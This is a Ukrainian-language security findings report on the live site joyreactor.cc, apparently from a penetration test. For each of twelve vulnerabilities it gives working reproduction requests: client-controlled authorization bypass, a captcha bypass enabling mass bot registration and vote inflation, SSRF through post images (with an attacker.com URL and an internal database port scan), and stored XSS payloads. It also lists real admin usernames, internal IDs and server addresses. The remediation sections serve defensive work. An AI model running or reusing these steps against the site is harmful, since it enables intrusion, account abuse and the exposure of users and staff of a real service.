# Findings — joyreactor.cc

---

## FIND-001 — GraphQL Introspection увімкнена в продакшні

**Severity:** Low  
**CVE:** Немає прямого CVE, OWASP API Security Top 10 — API8:2023 Security Misconfiguration

### Опис

Introspection дозволяє будь-якому запиту отримати повну структуру GraphQL API: всі типи, поля, аргументи, mutations. В продакшні це не повинно бути доступне публічно — це дає зловмиснику повну карту поверхні атаки.

### Доказ

```bash
curl -s -X POST https://api.joyreactor.cc/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { queryType { name } } }"}'
# {"data":{"__schema":{"queryType":{"name":"Query"}}}}
```

### Виправлення

Вимкнути introspection в продакшні. В Lighthouse (Laravel):

```php
// config/lighthouse.php
'introspection' => env('GRAPHQL_INTROSPECTION', false),
```

---

## FIND-002 — User Enumeration через `checkEmail`

**Severity:** Medium  
**CWE:** CWE-203 — Observable Discrepancy

### Опис

Query `checkEmail` повертає `true` якщо email зареєстрований, `false` якщо ні. Це дозволяє перебирати email адреси і дізнаватись хто є користувачем сервісу.

### Доказ

```bash
curl -s -X POST https://api.joyreactor.cc/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ checkEmail(email: \"admin@joyreactor.cc\") }"}'
# {"data":{"checkEmail":true}}   ← email зареєстрований

curl -s -X POST https://api.joyreactor.cc/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ checkEmail(email: \"notexists12345xyz@example.com\") }"}'
# {"data":{"checkEmail":false}}  ← email не існує
```

Різниця у відповідях підтверджує що можна точно визначити чи зареєстрований конкретний email.

### Вплив

- Можна зібрати список зареєстрованих email для подальших атак (phishing, credential stuffing)
- Немає видимого rate limiting

### Виправлення

- Прибрати query або повертати однакову відповідь для зареєстрованих і незареєстрованих email
- Додати rate limiting на цей endpoint

---

## FIND-003 — IDOR: поля захищені тільки на фронтенді через `@include(if: $selfOrAdmin)`

**Severity:** Low  
**CWE:** CWE-639 — Authorization Bypass Through User-Controlled Key

### Опис

Фронтенд використовує GraphQL директиву `@include(if: $selfOrAdmin)` щоб приховати певні поля профілю від звичайних користувачів. Змінна `selfOrAdmin` передається клієнтом і сервер **не перевіряє авторизацію** для частини цих полів — вони повертаються будь-кому хто вручну передасть `selfOrAdmin: true`.

### Кроки відтворення

1. Знайти запит `UserProfilePageQuery` в JS-коді сайту (передає `selfOrAdmin: false` для неавторизованих)
2. Надіслати той самий запит вручну з `selfOrAdmin: true` без токена авторизації:

```bash
curl -s -X POST https://api.joyreactor.cc/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "query($username: String!, $selfOrAdmin: Boolean!) { user(username: $username) { id active @include(if: $selfOrAdmin) postsBannedUntil @include(if: $selfOrAdmin) commentsBannedUntil @include(if: $selfOrAdmin) tagBans @include(if: $selfOrAdmin) { tag { id name } bannedUntil } } }",
    "variables": {"username": "Demonter", "selfOrAdmin": true}
  }'
```

### Відповідь (без авторизації)

```json
{
  "data": {
    "user": {
      "id": "VXNlcjoxMDM2NTE3",
      "active": true,
      "postsBannedUntil": null,
      "commentsBannedUntil": null,
      "tagBans": []
    }
  }
}
```

### Що доступно без авторизації

| Поле | Доступно? |
|------|-----------|
| `active` | ✅ так |
| `postsBannedUntil` | ✅ так |
| `commentsBannedUntil` | ✅ так |
| `tagBans` | ✅ так |
| `goldStatusExpire` | ❌ unauthorized |
| `platinumStatusExpire` | ❌ unauthorized |
| `settings` | ❌ unauthorized |
| `token` | ❌ unauthenticated |
| `phone` | ❌ unauthorized |
| `privateMessages` | ❌ unauthenticated |

### Додатково — ID адміна

```bash
curl -s -X POST https://api.joyreactor.cc/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user(username: \"admin\") { id username active } }"}'
# {"id":"VXNlcjoyNzE2Ng==","username":"admin","active":true}
# Base64 decode: User:27166
```

Внутрішній ID адміна (`27166`) доступний без авторизації.

### Вплив

- Можна перевірити чи забанений будь-який користувач і до якого часу
- Внутрішні ID всіх користувачів доступні через `user(username: ...)` без авторизації

### Виправлення

Перевірку прав перенести повністю на бекенд — не покладатись на клієнтські змінні (`selfOrAdmin`, `isAuthorised`). Поля `active`, `postsBannedUntil`, `commentsBannedUntil`, `tagBans` повинні перевіряти авторизацію на рівні резолверів так само як `token`, `phone`, `privateMessages`.

---

## FIND-004 — SSH: відсутня підтримка post-quantum key exchange

**Severity:** Informational  
**CWE:** CWE-327 — Use of a Broken or Risky Cryptographic Algorithm

### Опис

SSH сервер (OpenSSH на 51.68.155.228) не підтримує post-quantum алгоритми обміну ключами (наприклад `mlkem768x25519`). Це робить з'єднання потенційно вразливим до атаки "harvest now, decrypt later" — зловмисник може записати зашифрований трафік сьогодні і розшифрувати його у майбутньому за допомогою квантового комп'ютера.

### Доказ

```bash
ssh -o PasswordAuthentication=yes -o PubkeyAuthentication=no admin@joyreactor.cc
# WARNING: connection is not using a post-quantum key exchange algorithm.
# This session may be vulnerable to "store now, decrypt later" attacks.
# The server may need to be upgraded. See https://openssh.com/pq.html
```

Також підтверджено: SSH не приймає парольну автентифікацію (`Permission denied (publickey,gssapi-keyex,gssapi-with-mic)`).

### Виправлення

Оновити OpenSSH до версії 9.0+ та увімкнути `mlkem768x25519-sha256` як пріоритетний KexAlgorithm у `/etc/ssh/sshd_config`.

---

## FIND-005 — Небезпечні атрибути auth cookie (`jr_auth`)

**Severity:** High  
**CWE:** CWE-614 — Sensitive Cookie Without Secure Attribute, CWE-1004 — Sensitive Cookie Without HttpOnly Flag, CWE-352 — Cross-Site Request Forgery

### Опис

Cookie `jr_auth` використовується для авторизації користувача і містить auth токен. Три критичні проблеми з атрибутами:

| Атрибут | Значення | Проблема |
|---------|----------|----------|
| `HttpOnly` | `false` | JavaScript може читати cookie → крадіжка токена через XSS |
| `Secure` | `false` | Cookie передається по HTTP → перехоплення в незахищених мережах (MITM) |
| `SameSite` | `""` (порожній) | Немає захисту від CSRF → можливі cross-site запити від імені авторизованого юзера |

### Доказ

DevTools → Application → Cookies → `https://joyreactor.cc`:

```
Name:     jr_auth
Value:    0 (неавторизований) / <токен> (авторизований)
HttpOnly: false
Secure:   false
SameSite: (порожній)
Domain:   joyreactor.cc
```

### Вплив

- **XSS + HttpOnly:false** → будь-який XSS на домені дозволяє вкрасти `jr_auth` токен через `document.cookie`
- **Secure:false** → токен передається у відкритому вигляді по HTTP (публічний Wi-Fi, MITM атака)
- **SameSite:""** → CSRF атаки можливі — зловмисник може виконати дії від імені авторизованого юзера з іншого сайту

### Виправлення

```
Set-Cookie: jr_auth=<token>; HttpOnly; Secure; SameSite=Strict; Path=/
```

---

## FIND-006 — Captcha bypass через мобільний субдомен

**Severity:** Medium  
**CWE:** CWE-284 — Improper Access Control

### Опис

reCAPTCHA site key (`6LeXWnEpAAAAAK7LYPJC8zJFWPhBbjwdWPsSAmyD`) зареєстрований в Google Console тільки для `m.joyreactor.cc`, але не для основного домену `joyreactor.cc`. Через це:

1. На `joyreactor.cc/register` капча показує `ERROR: Invalid domain for site key` — форма реєстрації через UI недоступна
2. На `m.joyreactor.cc/register` капча працює і генерує валідний токен
3. Токен з мобільного домену **приймається основним GraphQL API** (`api.joyreactor.cc`)

Тобто captcha захист на реєстрацію обходиться просто відкривши мобільну версію сайту.

### Кроки відтворення

1. Відкрити `https://m.joyreactor.cc/register`
2. Отримати валідний captcha токен
3. Надіслати `register` mutation з цим токеном напряму до `api.joyreactor.cc/graphql`

### Доказ

```json
// Запит до api.joyreactor.cc з captcha токеном від m.joyreactor.cc
{"data":{"register":{"user":{"id":"VXNlcjoxMzIzODIz"}}}}
```

Акаунт успішно створено.

### Вплив

- Масова автоматична реєстрація ботів — достатньо один раз отримати токен з мобільної версії
- Основний домен `joyreactor.cc/register` для реальних користувачів зламаний (капча не відображається)

### Виправлення

Додати `joyreactor.cc` і всі субдомени до списку дозволених доменів в Google reCAPTCHA Console для site key `6LeXWnEpAAAAAK7LYPJC8zJFWPhBbjwdWPsSAmyD`.

---

## FIND-007 — Авторизація без підтвердження email

**Severity:** Low  
**CWE:** CWE-304 — Missing Critical Step in Authentication

### Опис

Після реєстрації сервер показує "Пора перевірити пошту" і відправляє confirmation email. Але при оновленні сторінки сесія вже активна — `me` query повертає дані користувача без підтвердження email.

### Доказ

```json
// me query одразу після реєстрації без підтвердження email
{
  "me": {
    "id": "VXNlcjoxMzIzODI0",
    "username": "dofyayirze",
    "active": false,
    "lastLogin": "2026-06-01T23:43:21+03:00"
  }
}
```

`active: false` — email не підтверджений, але сесія видана і користувач авторизований.

### Вплив

- Реєстрація ботів без доступу до email — акаунт одразу використовується
- В комбінації з FIND-006 (captcha bypass) — повністю автоматична масова реєстрація

### Виправлення

Не видавати сесійний токен до підтвердження email. Або блокувати дії (коментарі, пости) для `active: false` акаунтів.

---

## FIND-008 — Неактивні акаунти можуть голосувати (`vote` mutation)

**Severity:** Medium  
**CWE:** CWE-285 — Improper Authorization

### Опис

Акаунти з `active: false` (телефон не верифікований, email не підтверджений) можуть виконувати `vote` mutation і впливати на рейтинг постів. В комбінації з FIND-006 (captcha bypass) і FIND-007 (авторизація без підтвердження email) — можна масово створювати акаунти і накручувати рейтинг.

### Доказ

```javascript
// Акаунт dofyayirze, active: false
mutation { vote(id: "UG9zdDo2MzIzOTg0", vote: PLUS) { me { id } } }
// {"data":{"vote":{"me":{"id":"VXNlcjoxMzIzODI0"}}}}  ← успішно
```

### Що доступно неактивному акаунту

| Дія | Результат |
|-----|-----------|
| `vote` | ✅ працює |
| `comment` | ❌ заблоковано |
| `privateMessage` | ❌ unauthorized |

### Виправлення

Перевіряти `active: true` перед виконанням `vote` mutation на рівні резолвера.

---

## FIND-009 — SSRF через `post` mutation (обробка img src через FFmpeg)

**Severity:** Critical  
**CWE:** CWE-918 — Server-Side Request Forgery

### Опис

`post` mutation приймає HTML в полі `text`. Сервер витягує `src` атрибут з `<img>` тегів і завантажує URL через FFmpeg для обробки зображення. URL не валідується — можна вказати довільний зовнішній або внутрішній хост.

### Кроки відтворення

```javascript
mutation {
  post(tags:[], text:"<img src=https://attacker.com/ssrf>") {
    post { id }
  }
}
```

### Доказ

Запит до `webhook.site` підтвердив що сервер робить вихідний HTTP запит:

```
GET https://webhook.site/28e29f6d-f11e-4de9-a267-a13b98021e49
Host: 2a01:4f8:200:31a8::3c:3  (Hetzner, Falkenstein, Germany)
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/...
Accept: image/jpeg,*/*
```

Сервер запущений на **Hetzner** (не AWS/GCP) — IP `2a01:4f8:200:31a8::3c:3`.

### Потенційні вектори

- Сканування внутрішньої мережі (`10.x.x.x`, `192.168.x.x`, `172.16.x.x`)
- Доступ до внутрішніх сервісів (Redis, Elasticsearch, адмін панелі)
- `file://` протокол — читання локальних файлів сервера
- `http://localhost` — доступ до сервісів на loopback

### Внутрішній port scan через timing

| Порт | Сервіс | Час | Статус |
|------|--------|-----|--------|
| 9999 | (закритий baseline) | 883ms | закритий |
| 6379 | Redis | 883ms | невизначено |
| 3306 | MySQL | 1000ms | **відкритий** |
| 5432 | PostgreSQL | 1067ms | **відкритий** |

MySQL (3306) і PostgreSQL (5432) відповідають повільніше ніж закритий порт — ознака що сервіси запущені і приймають з'єднання.

### Виправлення

- Валідувати URL перед завантаженням — дозволяти тільки `http`/`https` з публічними IP
- Блокувати RFC1918 адреси (`10.x`, `172.16.x`, `192.168.x`), loopback, link-local
- Використовувати allowlist доменів для завантаження медіа

---

## FIND-010 — Stored HTML Injection через `post` mutation

**Severity:** High  
**CWE:** CWE-79 — Improper Neutralization of Input During Web Page Generation (XSS)

### Опис

Mutation `post(text: ...)` зберігає HTML-теги у тексті поста і рендерить їх без екранування. HTML-фільтр перевіряє атрибути з подвійними лапками (`href="..."`), але **не обробляє одинарні лапки** (`href='...'`). Це дозволяє обійти фільтр і зберегти довільний `<a href>` тег у пості.

### Доказ

**Підтверджений bypass (одинарні лапки):**

```
Input:   <a href='#'>click</a>       → CREATED, stored: <a href="#">click</a>
Input:   <a href="#">click</a>        → blocked
Input:   <a href=#>click</a>          → blocked
```

Пост `UG9zdDo2MzI0MDI1` на акаунті `dofyayirze` — `<a href="#">click</a>` рендериться як клікабельна HTML-лінка на `joyreactor.cc/user/dofyayirze`.

**Умова спрацювання:** акаунт `active: false` + запит через Python `requests.Session` під час рефрешу сесії через `remember_web` куку. З браузера та для активних акаунтів потребує додаткового дослідження.

### Статус перевірки

- [x] `<a href='#'>` з одинарними лапками — **підтверджено**, stored HTML рендериться
- [x] `<a href='javascript:alert(1)'>` — blocked окремою перевіркою протоколу
- [x] `comment` mutation — blocked для `active: false` акаунту
- [ ] XSS через JS execution — не підтверджено, потребує активного акаунту
- [ ] `<a href='https://evil.com'>` — потребує підтвердження на активному акаунті

### Виправлення

- Sanitize весь HTML на виводі (DOMPurify або аналог)
- Allowlist тегів і атрибутів, включаючи парсинг атрибутів з одинарними лапками
- Перевіряти `href` — дозволяти тільки відносні URL або відомі домени

---

## FIND-011 — Stored XSS у полях профілю (`userSettings`)

**Severity:** High  
**CWE:** CWE-79 — Stored XSS

### Опис

Mutation `userSettings(settings: {fullName, about})` зберігає довільний HTML у полях профілю без будь-якої санітизації. Поля повертаються через `user(username)` query будь-якому відвідувачу без авторизації.

### Доказ

```graphql
mutation {
  userSettings(settings: {
    fullName: "<script>alert(1)</script>",
    about: "<img src=x onerror=alert(1)>"
  }) { success }
}
# → success: true
```

```graphql
query {
  user(username: "dofyayirze") {
    settings { fullName about }
  }
}
# → fullName: "<a href='javascript:alert(1)'>xss</a>"
# → about: "<a href='javascript:alert(1)'>xss</a>"
```

Поточний Next.js фронтенд рендерить ці поля як escaped текст у формі налаштувань. Публічна сторінка профілю не відображає ці поля. Однак в бандлі знайдено `html-react-parser` (`826-*.js`) — якщо будь-який компонент передасть ці поля через парсер, виникне XSS для всіх відвідувачів профілю.

### Виправлення

- Sanitize `fullName` і `about` на рівні сервера перед збереженням
- Не зберігати сирий HTML у полях профілю

---

## FIND-012 — IDOR: приватні поля адмін-акаунтів доступні через `selfOrAdmin: true`

**Severity:** Medium  
**CWE:** CWE-639 — Authorization Bypass Through User-Controlled Key

### Опис

Розширення FIND-003: клієнт-контрольована директива `@include(if: $selfOrAdmin)` дозволяє читати приватні поля будь-якого користувача, включаючи адміністраторів. Поле `token` (JWT) захищене окремою перевіркою, `flags` також захищений. Але `postsBannedUntil`, `commentsBannedUntil`, `tagBans`, `moderatedTags` доступні для будь-якого акаунту.

### Знайдені адмін-акаунти

| username    | id (base64)          | decoded     |
|-------------|----------------------|-------------|
| Reactor     | VXNlcjoxNzQ2Mg==     | User:17462  |
| admin       | VXNlcjoyNzE2Ng==     | User:27166  |
| joy         | VXNlcjo4Mjk2MQ==     | User:82961  |
| joyreactor  | VXNlcjoyMTQyNA==     | User:21424  |
| moderator   | VXNlcjo3ODY4ODc=     | User:786887 |
| support     | VXNlcjoyMzI2Nw==     | User:23267  |

### Доказ

```graphql
query($s: Boolean!) {
  user(username: "reactor") {
    postsBannedUntil @include(if: $s)
    commentsBannedUntil @include(if: $s)
    tagBans @include(if: $s) { tag { name } }
    moderatedTags @include(if: $s) { mainTag { name } }
  }
}
# variables: { s: true }
# → повертає дані без помилки авторизації
```

### Виправлення

- Перевіряти на сервері що `selfOrAdmin` відповідає поточному залогіненому користувачу або адміну
- Не довіряти клієнт-контрольованим змінним для визначення рівня доступу

---

## TODO — Перевірити додатково

- [ ] `edit`/`delete` мутації на чужих постах — authorization bypass
- [ ] `temporaryImage` — SVG upload XSS
- [ ] Query batching — rate limit bypass
- [ ] Deeply nested queries — DoS
- [ ] Rate limiting на `checkEmail` і `resetPasswordRequest`
- [ ] XSS у `post`/`comment` mutation на активному акаунті
